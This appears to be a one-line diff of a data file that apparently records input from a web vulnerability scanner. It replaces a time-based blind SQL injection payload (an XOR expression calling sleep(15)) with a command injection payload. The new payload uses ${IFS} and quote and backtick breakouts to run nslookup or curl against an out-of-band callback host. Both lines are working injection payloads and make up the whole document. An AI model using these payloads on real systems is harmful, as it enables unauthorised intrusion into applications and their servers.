@@ -1,1 +1,1 @@
-5550"XOR(555*if(now()=sysdate(),sleep(15),0))XOR"Z
+&(nslookup${IFS}-q${IFS}cname${IFS}hitcyvwixlihx0ff96.bxss.me||curl${IFS}hitcyvwixlihx0ff96.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hitcyvwixlihx0ff96.bxss.me||curl${IFS}hitcyvwixlihx0ff96.bxss.me)&`'
